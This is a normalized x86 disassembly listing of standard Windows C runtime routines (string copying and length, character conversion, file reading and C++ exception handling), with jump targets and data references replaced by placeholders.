mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1000d4c0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000d4c0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000d4c0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1000d4c0 ]
sub_1000d515
push esi
call sub_1000d591
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_1000d588
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jb r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_1000d588
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_1000d588
mov [ eax ] 0xd
pop esi
retn
call sub_1000d588
mov [ eax ] 0x8
pop esi
retn
sub_1000d59a
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
cmp [ rw-data ] ebx
mov edi [ InterlockedDecrement@IAT ]
je r-xdata
mov eax [ esp + 0x8 ]
cmp eax 0x61
jl r-xdata
push [ esp + 0x10 ]
call sub_1000d609
test ebx ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
push esi
call edi
push 0x13
call sub_1000b26e
pop ecx
push 0x1
pop ebx
pop ebx
retn
cmp eax 0x7a
jg r-xdata
push esi
call edi
push 0x13
call sub_1000b2cf
pop ecx
jmp r-xdata
sub eax 0x20
pop ebx
retn
mov eax [ esp + 0x10 ]
pop edi
pop esi
sub_1000d609
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
pop ebx
leave
retn
cmp eax 0x7a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
and [ ebp + 0xa ] 0x0
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
push 0x2
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax 0x2
push 0x2
push ebx
call sub_10009dc8
pop ecx
pop ecx
jmp r-xdata
sub eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
pop eax
lea ecx [ ebp - 0x4 ]
push 0x1
push 0x0
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push [ rw-data ]
call sub_1000fda8
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_1000d6d5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_1000a610
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_1000fd50
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_1000d820
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_1000d830
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_1000d910
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_1000d98b
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_10010126
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_10010126
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor ecx ecx
mov edx rw-data
push 0x1a
call sub_1000b1a6
pop ecx
or [ edx ] 0xffffffff
test eax eax
jne r-xdata
mov esi ecx
mov eax ecx
sar esi 0x5
and eax 0x1f
mov esi [ esi * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
mov eax [ esi + eax * 4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add edx 0x20
inc ecx
cmp edx rw-data
jl r-xdata
sub_1000da47
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_1000b26e
pop ecx
retn
sub_1000da76
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_1000b26e
pop ecx
retn
sub_1000da99
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_1000b2cf
pop ecx
retn
sub_1000dac8
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_1000b2cf
pop ecx
retn
sub_1000daeb
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_1000fff7
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_1000dbc7
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
lea edi [ edi + ecx * 4 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_1000dbc7
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_1000d588
mov [ eax ] 0x9
call sub_1000d591
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_10010544
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_1000dc2c
push esi
mov edi eax
call sub_100105a3
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_1000dc2c
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x8 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edx ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea esi [ eax + eax * 8 ]
mov eax [ ecx * 4 + rw-data ]
lea edi [ ecx * 4 + rw-data ]
shl esi 0x2
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x2
jne r-xdata
test cl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ edi ]
push [ ebp + 0x10 ]
push edx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ edi ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
dec [ ebp + 0x10 ]
mov [ ebx ] al
mov eax [ edi ]
lea edx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
je r-xdata
call sub_1000d588
mov [ eax ] 0x9
call sub_1000d591
mov [ eax ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and al 0xfb
cmp [ ebx ] 0xa
jne r-xdata
push eax
call sub_1000d515
pop ecx
or eax 0xffffffff
jmp r-xdata
sub ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ edi ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ ebx ] al
inc ebx
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ edi ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc ebx
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_1000ee2c
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ ebx ] 0xd
mov ecx [ edi ]
inc ebx
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_1000de05
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_1000e859
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1000dea0
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1000e15a
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_1000dea0
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_1000e859
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_1000e7f8
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1000e053
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
call sub_1000e6f1
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_1000a3f2
add esp 0x14
mov ebx eax
call sub_1000e6f1
mov esi [ eax + 0x6c ]
call sub_1000e6f1
mov eax [ eax + 0x70 ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_100105c5
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_1000e859
push 0x1
push esi
call sub_1000e592
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_1000e0fd
add esp 0xc
test eax eax
jne r-xdata
call sub_1000e859
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1000e20e
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_1000e053
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_1000e6f1
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_1000a3f2
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000a2c7
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000e20e
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_1000e0fd
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_1000f450
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_1000e15a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_1000e859
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_1000e620
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_1000e20e
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_1000e3ce
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_1000a187
call sub_1000a1c9
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_1000e15a
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_1000e289
add esp 0x2c
test eax eax
je r-xdata
sub_1000e289
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x2c ] ebx
and [ ebp - 0x24 ] 0x0
mov esi [ ebp + 0xc ]
mov eax [ esi - 0x4 ]
mov [ ebp - 0x28 ] eax
call sub_1000e6f1
mov eax [ eax + 0x6c ]
mov [ ebp - 0x1c ] eax
call sub_1000e6f1
mov eax [ eax + 0x70 ]
mov [ ebp - 0x20 ] eax
call sub_1000e6f1
mov edi [ ebp + 0x8 ]
mov [ eax + 0x6c ] edi
call sub_1000e6f1
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x70 ] ecx
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push [ ebp + 0x14 ]
push esi
call sub_1000a24e
add esp 0x14
mov [ ebp - 0x2c ] eax
and [ ebp - 0x4 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
call sub_1000e356
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000e356
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
call sub_1000e6f1
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x6c ] ecx
call sub_1000e6f1
mov ecx [ ebp - 0x20 ]
mov [ eax + 0x70 ] ecx
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
call sub_1000a51a
push eax
push edi
call sub_1000e592
pop ecx
pop ecx
sub_1000e3a4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_1000e3ce
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
